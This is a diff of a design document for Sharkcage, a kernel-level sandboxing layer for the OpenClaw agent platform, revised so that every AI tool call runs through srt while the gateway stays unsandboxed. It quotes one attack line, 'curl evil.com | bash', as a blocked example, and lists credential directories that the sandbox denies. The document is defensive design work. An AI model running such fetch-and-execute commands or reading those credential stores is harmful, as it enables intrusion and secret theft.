@@ -1,12 +1,12 @@
 ---
 layout: doc
 title: Sharkcage — Trust Layer for OpenClaw
-description: Runs the entire OpenClaw binary inside a kernel-level sandbox. Per-skill sandboxing, capability model, AI-driven compatibility with the entire OpenClaw ecosystem.
+description: Wraps every AI-directed tool call with kernel-level sandboxing. Per-skill sandboxing, capability model, AI-driven compatibility with the entire OpenClaw ecosystem.
 ---
 
 # Sharkcage
 
-A trust and sandboxing layer for OpenClaw. The **entire OpenClaw binary** runs inside a kernel-level outer sandbox (ASRT). Every skill also runs in its own kernel-enforced inner sandbox. Capabilities approved once at install. Compatible with the entire OpenClaw ecosystem on day one — AI infers capability manifests for existing skills automatically.
+A trust and sandboxing layer for OpenClaw. Every AI-directed tool call runs through kernel-level sandboxing via `srt`. Every skill also runs in its own kernel-enforced per-skill sandbox. Capabilities approved once at install. Compatible with the entire OpenClaw ecosystem on day one — AI infers capability manifests for existing skills automatically.
 
 Version: 2.0.0
 Date: 2026-03-29
@@ -41,8 +41,8 @@ Date: 2026-03-29
 | What | Who Provides |
 |------|-------------|
 | 22+ chat channels, gateway, Pi agent, web UI, mobile apps, ClawHub | **OpenClaw** (unmodified) |
-| Entire OpenClaw binary runs inside outer ASRT sandbox | **Sharkcage** |
-| Per-skill kernel sandboxing via inner ASRT | **Sharkcage** |
+| Per-tool kernel sandboxing — every AI command runs through srt | **Sharkcage** |
+| Per-skill kernel sandboxing — each skill gets its own srt sandbox | **Sharkcage** |
 | Capability manifests — approve once, enforce always | **Sharkcage** |
 | AI inference of capabilities for existing OpenClaw skills | **Sharkcage** |
 | Skill scanning, Ed25519 signing, trust levels | **Sharkcage** |
@@ -92,50 +92,40 @@ Multi-project, multi-model, multi-agent. CI scanning. Audit logs. Cost tracking.
 
 ### 3.1 The Supervisor Model
 
-Sharkcage is a supervisor process that owns all sandboxes. The **entire OpenClaw binary** runs inside the outer sandbox. Each skill runs inside its own inner sandbox. The supervisor is the only unsandboxed process.
+Sharkcage is a supervisor process that owns all sandboxes. The OpenClaw gateway process runs unsandboxed — it serves deterministic chat server code, not AI-directed operations. Every individual AI tool call (bash, file read/write) goes through `srt --settings <session-policy>` via the sandbox backend. Each skill runs in its own per-skill srt sandbox. The supervisor manages skill sandboxes and audit logging.
 
 ```
-sc start (supervisor — the only unsandboxed process, ~200 lines)
+sc start (supervisor + process manager)
   │
-  ├── OUTER ASRT SANDBOX → OpenClaw (entire binary)
-  │   │  network: [signal-cli, openrouter.ai]  (init-locked, signed)
-  │   │  filesystem: [~/.openclaw/data]
-  │   │  deny: [~/.ssh, ~/.aws, ~/.gnupg]
-  │   │
-  │   │  OpenClaw Gateway + Pi Agent + sharkcage plugin
+  ├── OpenClaw (gateway — NOT sandboxed)
   │   │  Channels: Signal, Telegram, WhatsApp, Discord, HA, iMessage...
+  │   │  Sharkcage plugin registered as sandbox backend
   │   │
-  │   │  On tool call → IPC to supervisor via unix socket
+  │   │  On tool call → srt --settings <session-policy> /bin/sh -c <cmd>
+  │   │  On skill call → IPC to supervisor via unix socket
   │   │
   │   └── unix socket ──→ supervisor
   │
-  ├── INNER ASRT SANDBOX → meals worker
+  ├── PER-SKILL ASRT SANDBOX → meals worker
   │   network: [meals-api.wan0.cloud]
   │   filesystem: none
   │
-  ├── INNER ASRT SANDBOX → HA worker
+  ├── PER-SKILL ASRT SANDBOX → HA worker
   │   network: [homeassistant.local:8123]
   │   filesystem: none
   │
-  ├── INNER ASRT SANDBOX → coding agent
-  │   network: [github.com, registry.npmjs.org, openrouter.ai]
-  │   filesystem: [./workspace]
-  │   exec: [git, npm, node]
-  │
-  └── INNER ASRT SANDBOX → weather worker
-      network: [api.weather.com]
-      filesystem: none
+  └── PER-SKILL ASRT SANDBOX → coding agent
+      network: [github.com, registry.npmjs.org, openrouter.ai]
+      filesystem: [./workspace]
+      exec: [git, npm, node]
 ```
 
 **Key properties:**
-- The entire OpenClaw process is contained in the outer sandbox — not just plugins
-- OpenClaw cannot reach hosts that skills can reach (and vice versa)
+- Every AI tool call is kernel-sandboxed via srt — bash commands, file operations, all of them
+- The gateway process is NOT sandboxed — it runs deterministic server code, not AI-directed operations
 - Skills cannot reach each other's hosts
-- Installing a new skill never widens the gateway's attack surface
-- Uninstalling a skill removes its sandbox — no gateway config change needed
-- A compromised skill can't leverage the gateway's access (separate process)
-- A compromised gateway can't leverage a skill's access (separate process)
-- The supervisor is ~200 lines: spawn sandboxed processes, shuttle IPC messages
+- Installing a new skill never widens the tool sandbox
+- The supervisor spawns per-skill sandboxes and manages audit logging
 
 ### 3.2 Data Flow
 
@@ -143,7 +133,7 @@ sc start (supervisor — the only unsandboxed process, ~200 lines)
 User sends message on Signal
   │
   ▼
-OpenClaw (in outer ASRT) receives message, routes to Pi Agent
+OpenClaw (gateway, unsandboxed) receives message, routes to Pi Agent
   │
   ▼
 Pi Agent calls LLM (OpenRouter) → LLM returns tool call
@@ -152,13 +142,20 @@ Pi Agent calls LLM (OpenRouter) → LLM returns tool call
 Sharkcage interceptor (tool.before) inside OpenClaw:
   1. Identify which skill owns this tool
   2. Check capability approval
+
+  For regular tool calls (bash, file ops):
+  3. Sandbox backend invokes: srt --settings <session-policy> /bin/sh -c <cmd>
+  4. srt enforces filesystem + network policy at kernel level
+  5. Return result to Pi Agent
+
+  For skill calls:
   3. Send IPC request to supervisor: {skill, tool, args}
   │
   ▼
-Supervisor (unsandboxed):
+Supervisor:
   1. Look up skill's approved capabilities
   2. Generate ASRT config for this skill
-  3. Spawn (or reuse) skill worker process in its own inner ASRT sandbox
+  3. Spawn (or reuse) skill worker process in its own per-skill ASRT sandbox
   4. Pass tool call via stdin
   5. Read result from stdout
   6. Log to audit DB
@@ -171,31 +168,26 @@ Sharkcage interceptor returns result to Pi Agent
 Pi Agent formats response → OpenClaw → Signal → user
 ```
 
-### 3.3 Init-Locked Gateway Config
+### 3.3 Per-Tool Session Policies
 
-The outer sandbox config is generated at `sc init` and **signed**:
+Per-tool session policies are generated dynamically by the sandbox backend. Each session gets an ASRT config restricting filesystem and network access for all tool calls in that session.
 
 ```bash
-sc init
-  Which channels? → Signal
-  LLM provider? → OpenRouter
-
-→ ~/.config/sharkcage/gateway-sandbox.json:
-  network.allowedDomains: ["127.0.0.1:7583", "openrouter.ai"]
-  filesystem.allowWrite: ["~/.openclaw/data", "~/.config/sharkcage"]
-  signature: "ed25519:..."
+# Session policy example (generated at session start):
+~/.config/sharkcage/sessions/<session-id>.json:
+  network.allowedDomains: ["openrouter.ai"]
+  filesystem.allowWrite: ["~/.openclaw/data"]
+  filesystem.denyRead: ["~/.ssh", "~/.aws", "~/.gnupg"]
 ```
 
-**Changes require deliberate action:**
+Every AI tool call in that session is wrapped:
 ```bash
-sc config add-service telegram    # adds api.telegram.org
-sc config remove-service meals    # removes meals-api host
-# Each: confirm → re-sign → restart
+srt --settings ~/.config/sharkcage/sessions/<session-id>.json /bin/sh -c <cmd>
 ```
 
-**Tampering = refuse to start.** Signature mismatch → OpenClaw won't launch.
+**Policy is scoped to the session** — the sandbox backend generates a fresh policy per session based on the active skill's approved capabilities. No session-wide config file is signed or locked; enforcement is per-invocation at the kernel level.
 
-**Immutable audit trail:** every config change appended to `config-audit.jsonl`.
+**Immutable audit trail:** every tool call appended to `audit.db` with timestamp, tool, args, result, skill, and capability.
 
 ### 3.4 Sharkcage Sits Above the Agent
 
@@ -205,7 +197,7 @@ The coding agent runs inside the inner skill sandbox unaware of restrictions:
 Sharkcage Capability Gate
   "Does this skill have approved capabilities?" → YES/NO
       │
-Inner ASRT Sandbox (per-skill)
+Per-Skill ASRT Sandbox
   Kernel-enforced, scoped to approved hosts/paths
       │
 Coding Agent (Claude Code / Pi / OpenCode / Aider)
@@ -306,18 +298,20 @@ Stored in `~/.config/sharkcage/approvals/{skill-name}.json`. Version-pinned. New
 
 Kernel-enforced. Wraps any process — not just JS/TS.
 
-### 6.2 Outer Sandbox (Entire OpenClaw Process)
+### 6.2 Per-Tool srt Sandboxing
 
-The outer sandbox wraps the **entire OpenClaw binary** — not just the plugin layer. This is the critical distinction: even if a vulnerability exists in OpenClaw itself, it cannot escape the outer sandbox's constraints.
+Every AI-directed tool call is wrapped by the sandbox backend using `srt --settings <session-policy>`. The session policy is derived from the active skill's approved capabilities and enforced at the kernel level for each invocation.
 
 ```
-Outer ASRT config (generated at sc init, signed):
-  network.allowedDomains: ["127.0.0.1:7583", "openrouter.ai"]
+Session policy (generated dynamically per session):
+  network.allowedDomains: ["openrouter.ai"]
   filesystem.allowWrite: ["~/.openclaw/data", "~/.config/sharkcage"]
   filesystem.denyRead: ["~/.ssh", "~/.aws", "~/.gnupg"]
 ```
 
-### 6.3 Per-Skill ASRT Configuration (Inner Sandbox)
+The gateway process itself is not sandboxed — it runs deterministic server code. Only AI-directed operations (bash commands, file reads/writes passed through the sandbox backend) go through srt.
+
+### 6.3 Per-Skill ASRT Configuration
 
 Each skill gets its own ASRT config derived from approved capabilities:
 
@@ -326,7 +320,7 @@ Skill "meals" approved for:
   network.external: ["meals-api.wan0.cloud"]
   data.meals
 
-→ Inner ASRT config:
+→ Per-skill ASRT config:
   network.allowedDomains: ["meals-api.wan0.cloud"]
   filesystem.allowWrite: []
   filesystem.denyRead: ["~/.ssh", "~/.aws"]
@@ -338,7 +332,7 @@ Skill "coding-agent" approved for:
   system.files.write: ["./workspace"]
   network.external: ["github.com", "registry.npmjs.org"]
 
-→ Inner ASRT config:
+→ Per-skill ASRT config:
   network.allowedDomains: ["github.com", "registry.npmjs.org"]
   filesystem.allowWrite: ["./workspace"]
   filesystem.denyRead: ["~/.ssh", "~/.aws"]
@@ -356,7 +350,7 @@ No prompts at runtime. Violations are logged, not prompted:
 
 ### 6.5 Process Isolation
 
-Skills run **outside** the outer sandbox as separate processes. OpenClaw and skills cannot see each other's network scope or filesystem access. The supervisor mediates all communication via IPC.
+Skills run as separate processes in their own per-skill sandboxes. OpenClaw and skills cannot see each other's network scope or filesystem access. The supervisor mediates all communication via IPC.
 
 ---
 
@@ -469,9 +463,9 @@ sc plugin add https://github.com/user/some-skill
 ### Flow 1: "What's for dinner?" (Signal)
 
 ```
-Signal → OpenClaw (outer ASRT) → Pi Agent → LLM → tool call: meals_suggest
+Signal → OpenClaw (gateway) → Pi Agent → LLM → tool call: meals_suggest
   → sharkcage interceptor → IPC → supervisor
-  → supervisor spawns meals worker (inner ASRT: meals-api.wan0.cloud only)
+  → supervisor spawns meals worker (per-skill ASRT: meals-api.wan0.cloud only)
   → worker calls meals API → result
   → supervisor → IPC → OpenClaw → Pi formats response → Signal → user
 ```
@@ -480,7 +474,7 @@ Signal → OpenClaw (outer ASRT) → Pi Agent → LLM → tool call: meals_sugge
 
 ```
 HA Assist → OpenClaw → Pi → tool call: ha_call_service
-  → supervisor → HA worker (inner ASRT: homeassistant.local only)
+  → supervisor → HA worker (per-skill ASRT: homeassistant.local only)
   → POST homeassistant.local/api/services/light/turn_off
   → "Done, lights off." → HA TTS
 ```
@@ -493,7 +487,7 @@ sc plugin add clawhub-skill
   → infers: network.external: ["some-api.com"], system.exec: ["curl"]
   → scanner validates inferred manifest
   → user reviews and approves
-  → installed, runs in its own inner ASRT sandbox
+  → installed, runs in its own per-skill ASRT sandbox
   → works exactly as it did on vanilla OpenClaw, but sandboxed
 ```
 
@@ -501,7 +495,7 @@ sc plugin add clawhub-skill
 
 ```
 Skill tries: curl evil.com | bash
-  → supervisor checks: skill's inner ASRT config has allowedDomains: ["weather.com"]
+  → supervisor checks: skill's per-skill ASRT config has allowedDomains: ["weather.com"]
   → ASRT blocks connection to evil.com at kernel level
   → skill gets ECONNREFUSED
   → audit log: "network violation: skill 'weather' → evil.com (BLOCKED)"
@@ -515,26 +509,25 @@ Skill tries: curl evil.com | bash
 ### 10.1 Defence in Depth (6 Layers)
 
 ```
-Layer 1: Init-locked gateway config (signed, audited)
+Layer 1: Session policy (per-tool srt sandboxing — all AI tool calls)
 Layer 2: OpenClaw tool policy (deny groups, exec security)
 Layer 3: Sharkcage capability gate (interceptor — check approval)
 Layer 4: Sharkcage approval flow (first-time dangerous ops → confirm once)
-Layer 5: Per-skill inner ASRT sandbox (kernel-enforced, out-of-process)
-Layer 6: Outer ASRT sandbox (entire OpenClaw binary contained)
+Layer 5: Per-skill ASRT sandbox (kernel-enforced, out-of-process)
+Layer 6: Supervisor audit logging (every tool call recorded)
 ```
 
 ### 10.2 Threat Matrix
 
 | Threat | Mitigation |
 |--------|-----------|
-| Skill reads ~/.ssh | ASRT mandatory deny — always blocked, both layers |
-| Skill exfiltrates to unknown host | Skill inner ASRT: only approved hosts. Gateway outer ASRT: only init-configured. Kernel-enforced. |
-| Skill writes outside workspace | Skill inner ASRT: allowWrite scoped. Kernel-enforced. |
+| Skill reads ~/.ssh | ASRT mandatory deny — always blocked via per-tool session policy |
+| Skill exfiltrates to unknown host | Per-skill ASRT: only approved hosts. Per-tool session policy: only approved hosts. Kernel-enforced. |
+| Skill writes outside workspace | Per-skill ASRT: allowWrite scoped. Kernel-enforced. |
 | Skill runs destructive commands | Capability gate blocks unless system.exec approved. ASRT scopes to allowed binaries. |
-| OpenClaw binary itself compromised | Outer ASRT contains the entire process. Can't reach skill-only hosts. Signed config can't be widened. |
+| AI-directed tool call escapes sandbox | srt wraps every tool call — gateway runs no AI-directed operations unsandboxed. |
 | Skill accesses another skill's service | Out-of-process isolation. Meals worker can't reach HA. HA worker can't reach meals API. |
-| New skill widens gateway attack surface | Skills run outside outer sandbox. Installing skills never changes gateway config. |
-| Unconfigured channel accessed | Outer ASRT blocks the API host at kernel level. |
+| New skill widens tool sandbox | Skills run in their own per-skill sandboxes. Installing skills never changes other sandbox configs. |
 | Supply chain: malicious ClawHub skill | AI inference + scanner + user approval before any code runs. |
 | Prompt injection via tool results | Capability gate applies to subsequent calls. Cross-skill tool calls checked against originating skill. |
 
@@ -548,7 +541,7 @@ Layer 6: Outer ASRT sandbox (entire OpenClaw binary contained)
 
 **Gap 4: No runtime cost enforcement.** Audit log tracks usage. Improvement: budget caps per skill.
 
-**Gap 5: Nested ASRT (outer + inner).** Skills run outside outer ASRT, so no nesting issue. The supervisor spawns skill sandboxes independently.
+**Gap 5: srt overhead per tool call.** Every AI tool call forks a new srt process. For high-frequency tool use this adds latency. Improvement: reuse sandboxed worker processes per session.
 
 **Gap 6: AI inference accuracy.** AI might over-infer or under-infer capabilities. Mitigated by user review + edit capability. Improves with audit log feedback.
 
@@ -587,7 +580,7 @@ sharkcage/                         # Public umbrella
 | `yeet-core` | OpenClaw is the gateway. Custom Deno gateway was a stepping stone. Archived. |
 | `yeet-sandbox` | Supervisor has ASRT integration built in. Redundant. Archived. |
 
-### 11.3 Skills (separate repos, each its own inner sandbox)
+### 11.3 Skills (separate repos, each its own per-skill sandbox)
 
 ```
 sharkcage-skill-meals/             # Meal planning (DONE, needs IPC refactor)
@@ -598,7 +591,7 @@ sharkcage-skill-godot/             # Godot game dev via MCP (NOT STARTED)
 ```
 
 Any existing OpenClaw/ClawHub skill also works — AI infers capabilities automatically.
-MCP servers run as sandboxed skills (supervisor spawns them in inner ASRT, stdio transport).
+MCP servers run as sandboxed skills (supervisor spawns them in per-skill ASRT, stdio transport).
 
 ### 11.4 Runtime
 
@@ -657,7 +650,7 @@ sharkcage-skill-*                  (sdk for types — meals DONE, rest NOT START
 
 ### Phase 2: End-to-End Integration
 
-- [ ] `sc start` command: starts supervisor + entire OpenClaw binary in outer ASRT
+- [ ] `sc start` command: starts supervisor + OpenClaw gateway (unsandboxed) + sandbox backend
 - [ ] Install OpenClaw locally, register sharkcage plugin
 - [ ] Test: Signal message → OpenClaw → sharkcage interceptor → supervisor → sandboxed skill → result
 - [ ] Test: skill tries to reach unapproved host → ASRT blocks → audit log entry
